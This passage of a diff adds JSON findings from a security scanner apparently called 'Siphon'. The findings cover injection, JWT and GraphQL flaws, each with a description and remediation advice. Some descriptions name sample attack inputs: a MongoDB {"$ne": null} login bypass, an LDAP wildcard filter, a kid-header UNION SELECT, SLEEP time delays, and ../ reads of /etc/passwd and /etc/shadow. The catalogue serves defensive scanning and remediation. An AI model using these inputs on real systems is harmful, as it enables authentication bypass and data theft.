+    "cvss_score": 9.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+    "description": "Siphon confirmed a time-based blind SQL injection vulnerability. Injecting time-delay functions (e.g., SLEEP(5), WAITFOR DELAY, pg_sleep(5)) into an API parameter causes the server response to be delayed by the specified duration, confirming SQL execution. An attacker can exfiltrate the complete database using conditional time delays as an out-of-band data exfiltration channel. Time-based injection is reliable even when the application returns identical responses for true and false conditions, bypassing boolean-based detection.",
+    "remediation": "The remediation is identical to direct SQL injection (SI-089): use parameterized queries exclusively. Additionally, implement query timeout limits at the database level to limit the impact of time-delay attacks. Monitor for anomalously slow API response times as an indicator of time-based injection probing.",
+    "metasploit": [
+      "auxiliary/scanner/http/sqli_scanner"
+    ],
+    "exploitdb": [],
+    "references": [
+      "https://portswigger.net/web-security/sql-injection/blind",
+      "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
+      "https://github.com/sqlmapproject/sqlmap"
+    ]
+  },
+  {
+    "id": "SI-092",
+    "title": "NoSQL Injection in API Parameter",
+    "severity": "CRITICAL",
+    "category": "Injection",
+    "owasp_api": "API8:2023 Security Misconfiguration",
+    "owasp_web": "A03:2021 Injection",
+    "nist": [
+      "SI-10",
+      "SI-15"
+    ],
+    "cves": [],
+    "cvss_score": 9.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+    "description": "Siphon confirmed a NoSQL injection vulnerability. User-supplied input is incorporated into a NoSQL database query (MongoDB, CouchDB, Firebase, Cassandra) without sanitization, allowing injection of query operators. For example, injecting {\"$ne\": null} in a MongoDB authentication query bypasses login by matching any non-null password. NoSQL injection can enable authentication bypass, data exfiltration, and in some cases server-side JavaScript execution via the $where operator.",
+    "remediation": "Validate that all user-supplied query parameters are of the expected primitive type (string, number) before constructing database queries. For MongoDB, use the official driver's parameterization features and reject any input containing MongoDB operator characters ($, .). Use ODM libraries (Mongoose) that enforce schema validation. Disable JavaScript execution operators ($where) in MongoDB if not required. Apply input allowlist validation before any database query construction.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://portswigger.net/web-security/nosql-injection",
+      "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Penetration_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection",
+      "https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html"
+    ]
+  },
+  {
+    "id": "SI-093",
+    "title": "OS Command Injection in API Parameter",
+    "severity": "CRITICAL",
+    "category": "Injection",
+    "owasp_api": "API8:2023 Security Misconfiguration",
+    "owasp_web": "A03:2021 Injection",
+    "nist": [
+      "SI-10",
+      "SI-15"
+    ],
+    "cves": [],
+    "cvss_score": 10.0,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+    "description": "Siphon confirmed OS command injection in an API parameter. User-supplied input is passed directly or with insufficient sanitization to a system shell command (via exec, shell_exec, subprocess, os.system, Runtime.exec, etc.). An attacker can inject shell metacharacters (;, |, &&, backticks, $()) to execute arbitrary operating system commands with the privileges of the web application process. This provides full remote code execution on the server, enabling complete system compromise, data exfiltration, lateral movement, and persistence.",
+    "remediation": "Eliminate all use of shell command execution with user-supplied input. Replace shell-based functionality with language-native library calls that do not invoke a shell. If OS command execution is unavoidable, pass arguments as a list (not a string) to prevent shell interpretation, and validate all inputs against a strict allowlist of permitted values. Run the application with the minimum OS privileges necessary. Implement application sandboxing (containers, seccomp) to limit the impact of command injection.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://portswigger.net/web-security/os-command-injection",
+      "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html",
+      "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Penetration_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection"
+    ]
+  },
+  {
+    "id": "SI-094",
+    "title": "Server-Side Template Injection (SSTI)",
+    "severity": "CRITICAL",
+    "category": "Injection",
+    "owasp_api": "API8:2023 Security Misconfiguration",
+    "owasp_web": "A03:2021 Injection",
+    "nist": [
+      "SI-10",
+      "SI-15"
+    ],
+    "cves": [],
+    "cvss_score": 9.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "description": "Siphon confirmed Server-Side Template Injection (SSTI) in an API endpoint. User-supplied input is embedded directly into a server-side template (Jinja2, Twig, Freemarker, Velocity, Pebble, Smarty, ERB) and the template engine evaluates the injected expression. An attacker can exploit SSTI to execute arbitrary code within the template context, which typically provides full remote code execution equivalent to OS command injection. SSTI can be confirmed by injecting arithmetic expressions (e.g., {{7*7}}) and observing the evaluated result (49) in the response.",
+    "remediation": "Never concatenate user-supplied data directly into template strings. Pass user data as template variables that are rendered by the template engine safely, not as template code. Use templates that are defined statically in the codebase, not constructed dynamically from user input. If user-controlled templates are a business requirement, use a sandboxed template engine that prevents access to dangerous objects and methods.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://portswigger.net/web-security/server-side-template-injection",
+      "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Penetration_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection",
+      "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection"
+    ]
+  },
+  {
+    "id": "SI-095",
+    "title": "Path Traversal / Local File Inclusion in API",
+    "severity": "HIGH",
+    "category": "Injection",
+    "owasp_api": "API8:2023 Security Misconfiguration",
+    "owasp_web": "A03:2021 Injection",
+    "nist": [
+      "SI-10",
+      "AC-3"
+    ],
+    "cves": [],
+    "cvss_score": 8.6,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "description": "Siphon confirmed a path traversal vulnerability where a filename or path parameter in the API is used to read files from the server filesystem without adequate sanitization. By injecting '../' sequences, an attacker can read files outside the intended directory, including /etc/passwd, /etc/shadow, application configuration files containing database credentials and API keys, private keys, and other sensitive system files. Depending on the application's OS privileges and filesystem permissions, this may provide access to any file readable by the web process.",
+    "remediation": "Validate all file path inputs against a strict allowlist of permitted filenames or paths. Use a canonical path resolution function (realpath(), Path.resolve()) to normalize the path and verify it begins with the expected base directory before any file access. Never concatenate user input directly into filesystem paths. Implement OS-level filesystem isolation (chroot, container volumes) to prevent access outside the intended directory.",
+    "metasploit": [
+      "auxiliary/scanner/http/traversal"
+    ],
+    "exploitdb": [],
+    "references": [
+      "https://portswigger.net/web-security/file-path-traversal",
+      "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html",
+      "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Penetration_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling"
+    ]
+  },
+  {
+    "id": "SI-096",
+    "title": "LDAP Injection in API Parameter",
+    "severity": "HIGH",
+    "category": "Injection",
+    "owasp_api": "API8:2023 Security Misconfiguration",
+    "owasp_web": "A03:2021 Injection",
+    "nist": [
+      "SI-10",
+      "SI-15"
+    ],
+    "cves": [],
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "description": "Siphon confirmed an LDAP injection vulnerability where user-supplied input is incorporated into an LDAP query without sanitization. An attacker can inject LDAP filter metacharacters (*, (, ), \\, null bytes) to modify query logic, bypass authentication, or enumerate LDAP directory contents. For example, injecting '*)(uid=*)' into a username field can match all LDAP entries, bypassing authentication. LDAP injection can expose organizational directory data including user accounts, group memberships, email addresses, and phone numbers.",
+    "remediation": "Implement LDAP input validation that escapes all LDAP special characters in user-supplied values. Use framework-provided LDAP query parameterization where available. Validate that usernames conform to an expected format (alphanumeric with allowed characters only) before constructing LDAP queries. Apply the principle of least privilege to the LDAP service account: it should have read-only access to only the attributes required by the application.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html",
+      "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Penetration_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection",
+      "https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/"
+    ]
+  },
+  {
+    "id": "SI-097",
+    "title": "JWT Algorithm Confusion Attack (RS256 to HS256)",
+    "severity": "CRITICAL",
+    "category": "Authentication \u2014 JWT",
+    "owasp_api": "API2:2023 Broken Authentication",
+    "owasp_web": "A07:2021 Identification and Authentication Failures",
+    "nist": [
+      "IA-5",
+      "SC-8"
+    ],
+    "cves": [
+      "CVE-2016-10555"
+    ],
+    "cvss_score": 9.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "description": "Siphon confirmed an algorithm confusion attack where the API normally uses RS256 (asymmetric RSA) but also accepts tokens signed with HS256 (symmetric HMAC). An attacker can obtain the server's public RSA key (which is public by design) and use it as the HMAC secret to sign a forged HS256 token. If the server uses the algorithm from the token header rather than from its configuration to select the verification method, it will verify the forged token using the public RSA key as the HMAC secret, accepting the attacker's fabricated claims.",
+    "remediation": "Configure the JWT verification library to use a server-side algorithm allowlist that only permits the expected algorithm (e.g., RS256). Never determine the verification algorithm from the token's header \u2014 use the algorithm specified in server-side configuration. Use a JWT library version that explicitly defends against algorithm confusion attacks. Test JWT verification with forged HS256 tokens signed with the public key to confirm the fix.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://portswigger.net/web-security/jwt/algorithm-confusion",
+      "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/",
+      "https://nvd.nist.gov/vuln/detail/CVE-2016-10555",
+      "https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/"
+    ]
+  },
+  {
+    "id": "SI-098",
+    "title": "JWT \u2014 jku/x5u Header Injection (JWKS Spoofing)",
+    "severity": "CRITICAL",
+    "category": "Authentication \u2014 JWT",
+    "owasp_api": "API2:2023 Broken Authentication",
+    "owasp_web": "A07:2021 Identification and Authentication Failures",
+    "nist": [
+      "IA-5",
+      "SC-8"
+    ],
+    "cves": [
+      "CVE-2018-0114"
+    ],
+    "cvss_score": 9.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "description": "Siphon confirmed that the API fetches the JWT verification key from the URL specified in the jku (JWK Set URL) or x5u (X.509 Certificate Chain URL) header parameter without validating it against an allowlist. An attacker can craft a JWT with a jku pointing to an attacker-controlled server hosting a JWKS with the attacker's own public key, then sign the JWT with the corresponding private key. The server fetches the attacker's JWKS and verifies the signature successfully, accepting forged tokens with arbitrary claims.",
+    "remediation": "Implement strict allowlist validation of the jku and x5u header values before fetching any key material. Only accept jku values matching pre-configured trusted URLs. Prefer a static, server-side configured verification key over dynamic key fetching. If JWKS rotation is required, implement it through a server-side key rotation mechanism rather than accepting jku from tokens. Reject any token whose jku does not match the configured JWKS endpoint.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection",
+      "https://nvd.nist.gov/vuln/detail/CVE-2018-0114",
+      "https://datatracker.ietf.org/doc/html/rfc7515#section-4.1.2",
+      "https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/"
+    ]
+  },
+  {
+    "id": "SI-099",
+    "title": "JWT \u2014 kid Header SQL Injection",
+    "severity": "CRITICAL",
+    "category": "Authentication \u2014 JWT",
+    "owasp_api": "API2:2023 Broken Authentication",
+    "owasp_web": "A07:2021 Identification and Authentication Failures",
+    "nist": [
+      "IA-5",
+      "SI-10"
+    ],
+    "cves": [],
+    "cvss_score": 9.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "description": "Siphon confirmed that the JWT kid (key ID) header value is incorporated into a SQL query without parameterization when looking up the verification key. An attacker can inject SQL syntax into the kid header to manipulate the key lookup query. A common payload is \"' UNION SELECT 'attacker_secret' --\" which causes the server to use 'attacker_secret' as the verification key. The attacker then signs a forged JWT with 'attacker_secret', which the server accepts, enabling complete authentication bypass with arbitrary claims.",
+    "remediation": "Use parameterized queries for all database operations involving JWT header values. Validate the kid header value against an allowlist of known key identifier formats before any database lookup. Sanitize kid values by allowing only alphanumeric characters and hyphens. Consider using an in-memory key store rather than database-backed key lookup to eliminate the SQL injection vector entirely.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-sql-injection",
+      "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
+      "https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/"
+    ]
+  },
+  {
+    "id": "SI-100",
+    "title": "JWT HMAC Secret Cracked",
+    "severity": "CRITICAL",
+    "category": "Authentication \u2014 JWT",
+    "owasp_api": "API2:2023 Broken Authentication",
+    "owasp_web": "A07:2021 Identification and Authentication Failures",
+    "nist": [
+      "IA-5",
+      "SC-28"
+    ],
+    "cves": [
+      "CVE-2018-1000531"
+    ],
+    "cvss_score": 9.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "description": "Siphon successfully cracked the HMAC signing secret used by the API to sign JWTs using offline dictionary or brute-force attack (via hashcat or jwt-cracker). A weak or commonly-used HMAC secret can be recovered by testing the signature against wordlists. With the known secret, an attacker can forge arbitrary JWTs with any claims including elevated roles, extended expiry, or a different subject (user ID), achieving complete authentication bypass and privilege escalation to any account.",
+    "remediation": "Immediately rotate the JWT signing secret. Generate a new HMAC secret using a cryptographically secure random number generator with at least 256 bits of entropy. Store the secret in a secrets management system (HashiCorp Vault, AWS Secrets Manager). Consider migrating to asymmetric signing (RS256, ES256) where the private signing key is never shared and cannot be recovered from the token alone. Invalidate all existing tokens by changing the secret.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key",
+      "https://nvd.nist.gov/vuln/detail/CVE-2018-1000531",
+      "https://github.com/lmammino/jwt-cracker",
+      "https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/"
+    ]
+  },
+  {
+    "id": "SI-101",
+    "title": "GraphQL Introspection Enabled (Production)",
+    "severity": "HIGH",
+    "category": "GraphQL Security",
+    "owasp_api": "API8:2023 Security Misconfiguration",
+    "owasp_web": "A05:2021 Security Misconfiguration",
+    "nist": [
+      "CM-6",
+      "CM-7"
+    ],
+    "cves": [],
+    "cvss_score": 6.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "description": "The GraphQL API has introspection enabled in what appears to be a production environment (based on the target scope or deployment indicators). Introspection allows any client to enumerate the complete API schema including all types, fields, mutations, subscriptions, argument names and types, and field deprecation status. This provides an attacker with a complete and accurate map of the entire API surface without any prior knowledge, enabling systematic testing of every field and mutation for vulnerabilities.",
+    "remediation": "Disable GraphQL introspection in production. Configure the GraphQL server to reject __schema and __type queries in non-development environments. Use environment variables to control introspection availability. If schema access is needed by internal tooling, restrict it via authentication and IP allowlist rather than leaving it publicly accessible.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html",
+      "https://portswigger.net/web-security/graphql",
+      "https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/"
+    ]
+  }
+]
